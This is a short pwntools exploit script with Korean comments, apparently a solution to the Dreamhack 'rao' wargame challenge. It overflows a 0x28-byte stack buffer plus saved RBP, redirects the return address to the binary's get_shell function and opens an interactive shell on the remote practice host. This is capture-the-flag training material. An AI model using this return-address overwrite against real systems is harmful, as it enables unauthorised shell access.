from pwn import *

def exploit():
    # Dreamhack 제공 리모트 주소와 포트
    p = remote("host3.dreamhack.games", 12345)

    # 로컬 바이너리 로드 (심볼 추출용)
    e = ELF('./rao')

    # 오프셋: buf(0x28) + saved RBP(0x8)
    offset = 0x28 + 0x8
    get_shell = e.symbols['get_shell']
    log.success(f"get_shell @ {hex(get_shell)}")

    payload = b'A' * offset
    payload += p64(get_shell)

    p.sendlineafter("Input: ", payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
